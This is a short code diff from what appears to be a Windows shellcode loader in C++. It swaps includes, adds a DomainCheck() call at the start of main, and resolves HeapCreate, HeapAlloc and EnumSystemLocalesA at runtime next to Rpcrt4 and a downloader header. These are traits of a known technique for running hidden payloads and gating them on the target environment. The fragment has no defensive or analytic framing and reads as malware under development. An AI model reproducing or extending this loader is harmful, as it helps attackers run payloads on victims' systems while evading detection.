@@ -1,6 +1,5 @@
-#include <Rpc.h>
-#include <iostream>
-#include "apiresolv.h"
+#include "headers.h"
+#include "checks.h"
 #include "downloader.h"
 
 #pragma comment(lib, "Rpcrt4.lib")
@@ -42,10 +41,15 @@ typedef BOOL(WINAPI* _Chandle)(
 int main()
 {
 
+
+    DomainCheck();
+
     printf("INitialize Loader\n");
 
     HMODULE rpcdll = GetModuleHandleA("Rpcrt4.dll");
+    
     HMODULE Hmod = GetModuleHandleA("Kernel32.dll");
+
     _HeapCreate HeapC = (_HeapCreate)GetProcAddress(Hmod, "HeapCreate");
     _HeapAlloc HeapAC = (_HeapAlloc)GetProcAddress(Hmod, "HeapAlloc");
     _EnSysLocal ensys = (_EnSysLocal)GetProcAddress(Hmod, "EnumSystemLocalesA");
